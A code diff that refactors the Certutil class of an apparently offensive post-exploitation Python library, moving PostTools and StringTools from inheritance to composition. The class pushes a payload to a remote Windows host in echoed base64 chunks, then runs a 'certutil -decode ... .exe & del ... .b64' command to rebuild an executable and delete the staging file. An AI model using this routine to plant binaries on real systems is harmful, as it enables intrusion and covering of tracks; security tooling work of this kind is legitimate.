@@ -30,14 +30,17 @@ from pex.tools.post import PostTools
 from pex.tools.string import StringTools
 
 
-class Certutil(PostTools, StringTools):
+class Certutil:
+    post_tools = PostTools()
+    string_tools = StringTools()
+
     def push(self, sender, data, location, args=[], linemax=100):
         decode_stream = "certutil -decode {}.b64 {}.exe & del {}.b64"
 
         echo_stream = "echo {} >> {}.b64"
         echo_max_length = linemax
 
-        data = self.base64_string(data, encoded=True)
+        data = self.string_tools.base64_string(data, encoded=True)
 
         size = len(data)
         num_parts = int(size / echo_max_length) + 1
@@ -51,7 +54,7 @@ class Certutil(PostTools, StringTools):
 
                 if block:
                     command = echo_stream.format(block, location)
-                    self.post_command(sender, command, args)
+                    self.post_tools.post_command(sender, command, args)
 
         command = decode_stream.format(location, location, location)
-        self.post_command(sender, command, args)
+        self.post_tools.post_command(sender, command, args)
